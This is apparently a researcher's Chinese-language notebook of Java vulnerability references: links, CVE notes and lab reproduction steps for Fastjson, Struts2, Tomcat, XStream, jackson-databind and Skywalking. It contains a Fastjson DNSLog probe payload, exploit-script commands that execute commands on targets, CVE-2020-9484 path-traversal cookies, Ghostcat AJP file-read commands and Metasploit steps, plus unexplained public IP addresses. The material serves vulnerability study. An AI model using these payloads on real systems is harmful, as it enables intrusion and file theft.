# java 漏洞

https://www.upguard.com/blog/top-10-java-vulnerabilities-and-how-to-fix-them
https://snyk.io/blog/162-security-vulnerabilities-disclosed-in-javas-top-10-libraries-including-jackson-spring-and-jetty/

## java
https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-19117/Oracle-JRE.html
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=java
https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-19116/version_id-168996/Oracle-JDK-1.8.0.html

## spring

https://spring.io/projects/spring-boot
https://start.spring.io/

Spring Boot干货系列：（一）优雅的入门篇
http://tengj.top/2017/02/26/springboot1/

SpringMVC、SpringFramework与SpringBoot简单介绍
https://segmentfault.com/a/1190000021986315

Spring和SpringBoot比较，解惑区别
https://www.jianshu.com/p/ffe5ebe17c3a

## Fastjson

[Fastjson 反序列化漏洞史](https://paper.seebug.org/1192/)



<!-- 
sec\udesk.sec.java.md
fastjson.20200325.md
-->

 [Fastjson<=1.2.48远程代码执行漏洞分析](https://yaofeifly.github.io/2019/07/28/fastjson/)
  
  [fastjson 1.2.61远程代码执行漏洞分析&复现](https://curz0n.github.io/2019/09/24/fastjson_1_2_61_blacklist_bypass/)

  浅析Fastjson1.2.62-1.2.68反序列化漏洞
  https://www.anquanke.com/post/id/232774

  [红队武器库:fastjson小于1.2.68全漏洞RCE利用exp](https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/)

  fastjson remote code execute poc 直接用intellij IDEA打开即可 首先编译得到Test.class，然后运行Poc.java
  https://gitee.com/huayu696/fastjson-poc

  [fastjson在一些特殊场景下的漏洞挖掘与利用](https://www.anquanke.com/post/id/222946)

  [Fastjson反序列化漏洞分析 第二弹](https://tiaotiaolong.net/2020/06/18/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E5%BC%B9/)

[Fastjson < 1.2.68版本反序列化漏洞分析篇](https://www.anquanke.com/post/id/219731)

[Fastjson68版本绕过autotype原理及利用场景分析](https://www.freebuf.com/vuls/240392.html)

[Fastjson <1.2.48 入门调试](https://www.anquanke.com/post/id/209915)

[Fastjson 1.2.24反序列化漏洞深度分析](https://www.anquanke.com/post/id/211035)

[Fastjson1.2.24漏洞复现详细过程](https://www.freebuf.com/articles/web/242712.html)

[不安全的序列化](https://www.freebuf.com/articles/web/244476.html)

[Fastjson批量检查及一键利用工具](https://www.freebuf.com/sectool/244113.html)

[fastjson<=1.2.62远程代码执行漏洞通告](https://www.anquanke.com/post/id/199527)

访问地址: 118.193.36.37:43170

{ "zeo": {"@type":"java.net.Inet4Address","val":"m9ng8n.dnslog.cn"]]

https://github.com/mrknow001/fastjson_rec_exploit

git clone git@github.com:mrknow001/fastjson_rec_exploit.git

118.89.54.172

python3 fastjson.py -u http://192.168.1.3/ -s 192.168.1.1 -c "touch /tmp/test.txt

python fastjson_rce_exploit.py -u http://192.168.56.107:8090/ -s 192.168.56.1 -c "touch /tmp/test.txt"

https://github.com/mrknow001/fastjson_rec_exploit/archive/master.zip

[vulhub](https://vulhub.org/)


## Struts2

+ [x] Struts2 真的落后了吗? 是 https://github.com/apache/struts/releases 基本不更新了
+ [ ] 现在流行的又是什么? Spring+SpringMVC+Mybatis

Apache Struts 官方披 露S2-061 远程代码执行漏洞（ CVE-2020-17530 ）。
当开发人员强制使用OGNL解析时，某些特殊的TAG属性可能会被双重解析，进而导致远程代码执行。

参考链接： https://cwiki.apache.org/confluence/display/WW/S2-061

[内含POC丨漏洞复现之S2-061（CVE-2020-17530）](https://www.anquanke.com/post/id/225252)
[Struts2 S2-061漏洞分析(CVE-2020-17530)](https://mp.weixin.qq.com/s/RD2HTMn-jFxDIs4-X95u6g)


https://struts.apache.org/#
https://struts.apache.org/announce#a20201208

[Struts2-059 远程代码执行漏洞（CVE-2019-0230）分析](https://www.anquanke.com/post/id/216629)

Struts 2.3.24
https://archive.apache.org/dist/struts/2.3.24/struts-2.3.24-all.zip

TODO: idea创建 struts2项目: 应该需要升级idea
Failed to download 'http://central.maven.org/maven2/org/apache/struts/struts2-core/2.5.14.1/struts2-core-2.5.14.1.jar'
central.maven.org 这个域名已经没有了

        <url>https://repo1.maven.org/maven2</url>
https://stackoverflow.com/questions/62075914/intellij-create-sample-struts-web-project-with-java-then-show-this-error
because: "Beginning January 15, 2020, The Central Repository will no longer support communication over HTTP" (https://blog.sonatype.com/central-repository-moving-to-https)

[Struts2入门这一篇就够了](https://juejin.im/post/6844903573545811982)

## fastjson

[Fastjson历史漏洞研究（一）](https://www.anquanke.com/post/id/215753)

[FastJson历史漏洞研究（二）](https://www.anquanke.com/post/id/218268)

## Tomcat

### Tomcat websocket 拒绝服务漏洞利用代码披露（CVE-2020-13935） (SCA:ACSV-2020-111301)

条件：

1. 有ws功能，默认examples下面有
2. 版本小于 8.5.57 9.0.37 10.0.0-M7 

危害： 服务器CPU百分百

https://github.com/RedTeamPentesting/CVE-2020-13935

### Apache Tomcat Session 反序列化代码执行漏洞（CVE-2020-9484） (SCA:CVE-2020-9484)

1. 版本小于： 8.5.55/8.5.63 9.0.35/9.0.43 10.0.2

CVE-2021-25329 上一个没有处理完
CVE-2020-9484

https://github.com/masahiro331/CVE-2020-9484

好像没有什么效果

```bash
curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'
curl 'http://192.168.56.130:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../tmp/123.txt'
```

https://github.com/masahiro331/CVE-2020-9484
git clone https://github.com/masahiro331/CVE-2020-9484.git
https://github.com/IdealDreamLast/CVE-2020-9484
https://y4er.com/post/cve-2020-9484-tomcat-session-rce/
https://www.freebuf.com/vuls/245232.html
https://threedr3am.github.io/2020/06/12/CVE-2020-9484%20Tomcat-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/

攻击者可以控制服务器上的文件名/文件内容；
服务器上配置使用了PersistenceManager的FileStore；
PersistenceManager配置了sessionAttributeValueClassNameFilter值为“NULL”或者其他宽松的过滤器，使得攻击者可以提供反序列化对象；
攻击者知道FileStore使用的存储位置到可控文件的相对路径。

### ghostcat Tomcat-AJP 文件读取与包含漏洞（CVE-2020-1938） (SCA:ACSV-2020-022001)

AJP Connector，它使用的是 AJP 协议（Apache Jserv Protocol）是定向包协议。
因为性能原因，使用二进制格式来传输可读性文本，它能降低 HTTP 请求的处理成本，因此主要在需要集群、反向代理的场景被使用。

条件：

1. 打开8009，8.5.50前默认是打开8009的
2. 版本小于 8.5.51 9.0.31

[POC1](https://github.com/hypn0s/AJPy) 这个工具只针对这个CVE

```bash
wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/bin/apache-tomcat-8.5.50.tar.gz
tar xzf *.gz
python tomcat.py version 192.168.56.130
```

必须打开 8009才能直接使用，这个是直接获取的请求
python tomcat.py read_file --webapp=examples /WEB-INF/web.xml 192.168.56.130

不能获得
python tomcat.py read_file --webapp=examples /tmp/123.txt 192.168.56.130

这个好像拿到的和原文件不同
python tomcat.py read_file --webapp=examples /jsp/sessions/carts.jsp 192.168.56.130
cat ~/tomcat/apache-tomcat-8.5.50/webapps/examples/jsp/sessions/carts.jsp  

如果没有账号和密码，这个也取不到
python tomcat.py read_file --webapp=manager /WEB-INF/jsp/connectorTrustedCerts.jsp 192.168.56.130

下面这个应该是拿不到的
conf/tomcat-users.xml

[一文详解Tomcat Ghostcat-AJP协议文件读取/文件包含漏洞CVE-2020-1938](https://zhuanlan.zhihu.com/p/137527937)

成功
```bash
sudo msfconsole
search tomcat
use auxiliary/admin/http/tomcat_ghostcat
SET RHOSTS 192.168.56.130
SET RPORT 8009
run
```

[Apache Tomcat - AJP 'Ghostcat File Read/Inclusion](https://www.exploit-db.com/exploits/48143)

[xray 长亭科技 tomcat ghostcat 扫描](https://www.chaitin.cn/zh/ghostcat)

[CVE-2020-1938：Apache Tomcat服务器任意文件读取/包含漏洞通告](https://www.anquanke.com/post/id/199351)

[CVE-2020-1938 : Tomcat-Ajp 协议漏洞分析](https://www.anquanke.com/post/id/199448)

```xml
<Connector port="8080" protocol="HTTP/1.1"
             connectionTimeout="20000"
             redirectPort="8443" />
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
```
### xstream

[20201214 CVE-2020-26258/26259：XStream 反序列化漏洞通告](https://www.anquanke.com/post/id/225489)
> [XStream 反序列化漏洞（CVE-2020-26258 & 26259）的复现与分析](https://www.anquanke.com/post/id/226241)
CVE-2020-26259 只要（运行 XStream 服务的）进程有足够的权限，那么当 XStream 在反序列化数据时，攻击者构造特定的XML/JSON 请求，可以造成任意文件删除。
CVE-2020-26258 运行 XStream 的服务在反序列化数据时，攻击者构造特定的 XML/JSON 请求，可以造成服务端请求伪造。

[20201119 XStream反序列化CVE-2020-26217漏洞分析](https://www.anquanke.com/post/id/222830)
[剖析xmlDecoder反序列化](https://www.anquanke.com/post/id/226575)
[以CVE-2020-8840为例分析Jackson漏洞](https://www.anquanke.com/post/id/226006)
[FastJson<=1.2.68RCE原理详细分析](https://www.anquanke.com/post/id/225439)

### jackson-databind

这个有记录，但没有评分
https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jackson-databind+2.8.7
有评分，但不全
https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-42991/Fasterxml-Jackson-databind.html

http://www.nsfocus.net/index.php?os=&type_id=&keyword=jackson-databind&act=sec_bug&submit=+

jackson-databind-2.9.10.7.jar	
json-smart-2.3.jar

https://github.com/shadowsock5/jackson-databind-POC
https://github.com/shengqi158/Jackson-databind-RCE-PoC/blob/master/src/main/java/jackson/Poc.java

CVE-2020-35728
https://github.com/amcai/myscan
https://github.com/amcai/myscan/blob/master/myscan/pocs/perscheme/myscan_jackson_cve-2020-35728.py
https://github.com/amcai/myscan/commit/07b468284e931a065d4128903faf395aad68db81

https://github.com/Al1ex/CVE-2020-35728

Jackson反序列化漏洞（ CVE-2020-36188 ）从通告到POC
https://www.anquanke.com/post/id/227943

FasterXML jackson-databind远程代码执行漏洞
http://www.nsfocus.net/vulndb/48648
FasterXML jackson-databind 2.x<=Version <2.9.10.5
CVE(CAN) ID: CVE-2020-14061

http://www.nsfocus.net/vulndb/48653
FasterXML jackson-databind >=2.9.0
FasterXML jackson-databind <2.8.11.5
CVE(CAN) ID: CVE-2019-14893

http://www.nsfocus.net/vulndb/48650
FasterXML jackson-databind 2.x<=Version <2.9.10.5
CVE(CAN) ID: CVE-2020-14062

http://www.nsfocus.net/vulndb/48649
FasterXML jackson-databind 2.x<=Version <2.9.10.5
CVE(CAN) ID: CVE-2020-14060

CVE-2020-35728：FasterXML jackson-databind 2.x RCE漏洞|POC
https://github.com/Al1ex/CVE-2020-35728
[CVE-2020-8840: FasterXML/jackson-databind 远程代码执行漏洞通告](https://www.anquanke.com/post/id/199519)

从Java RMI反序列化到内网沦陷
https://www.anquanke.com/post/id/228569

## Skywalking

attack: Enterprise> Persistent> Server Software Component> Web Shell

[【安全通报】Skywalking 远程代码执行漏洞](https://nosec.org/home/detail/4678.html)


[【漏洞预警】Apache Skywalking GraphQL 注入与远程代码执行漏洞](https://help.aliyun.com/noticelist/articleid/1060803348.html?spm=5176.2020520154.sas.27.7dad5lTv5lTvEE)

Skywalking历史上存在两次sql注入漏洞，CVE-2020-9483、CVE-2020-13921
修复建议
升级Apache Skywalking 到最新的 v8.4.0 版本。
将默认H2数据库替换为其它支持的数据库。
